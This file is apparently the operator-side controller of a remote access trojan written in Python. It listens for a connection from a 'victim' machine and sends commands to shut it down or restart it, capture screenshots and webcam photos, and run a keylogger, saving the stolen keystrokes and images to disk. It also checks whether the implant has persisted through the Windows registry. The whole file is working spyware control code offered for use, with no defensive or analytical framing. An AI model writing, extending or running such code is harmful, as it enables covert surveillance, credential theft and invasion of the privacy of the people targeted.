import socket
import sys
from dotenv import load_dotenv
import os

load_dotenv()
print('[1]------->shutdown the system')
print('[2]------->restart the system')
print('[3]------->screenshot the system')
print('[4]------->webcam photo if its a laptop')
print('[5]------->Keylogging')
print('[6]------->disconnect from the victim')
print('YOU CANT EXECUTE 4TH COMMAND IF ITS A DESKTOP')


s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = int(os.getenv('PORT'))
s.bind((host,port))
count = 1
log_count = 1

def login():
   print("Waiting for connection:")
   s.listen(1)
   conn , addr = s.accept()
   print(addr,"=is connected")
   wmess = conn.recv(1024).decode()
   print(wmess)
   if wmess == 'Added to WR':
      reg = True
   else:
      reg = False
   
   
   while True:
      print('INPUT THE COMMAND TO BE EXECUTED:',end="")
      get_input = input()
      if(get_input == '5'):
         global log_count
         conn.send(get_input.encode())
         print("command is sent")
         print("Type 8 to quit the keylogging process")
         while True:
            name = input()
            if(name != '8'):
               continue
            else:
               break
         conn.send(name.encode())
         data = conn.recv(1024).decode()
         message = conn.recv(int(data)).decode()
         f = open('logged'+'-'+str(log_count)+'.txt','w')
         f.write(message)
         f.close()
         log_count+=1
         print('System Logged')

      elif(get_input=='1' or get_input=='2' or get_input=='6'):
         if not reg:
            print('Warning:App not added to Windows registry. Press 9 to continue and 10 to abort')
            if input() == '9':
               conn.send(get_input.encode())
               print("command is sent")
               data = conn.recv(1024).decode()
               if data:
                  print(data)
                  conn.close()
               sys.exit()
         
         else:
            conn.send(get_input.encode())
            print("command is sent")
            data = conn.recv(1024).decode()
            if data:
               print(data)
               conn.close()
            if get_input == '6':
               sys.exit()
            else:
               break
            
      elif(get_input=='3' or get_input=='4'):
         conn.send(get_input.encode())
         print("command is sent")
         data = conn.recv(1024)
         if get_input == '4' and data == 'Error':
            print('Image Capturing Failed')
         else:
            global count
            f = open('recvImg'+'-'+str(count)+'.jpg','wb')
            temp = conn.recv(int(data))
            f.write(temp)
            f.close()
            count += 1
            print('Image received..')

      else:
          print("YOU HAVE ENTERED WRONG DATA!!!!!!PLEASE ENTER 1 OR 2 OR 3 OR 4 OR 5")

if __name__ == "__main__":
   while True:
      login()
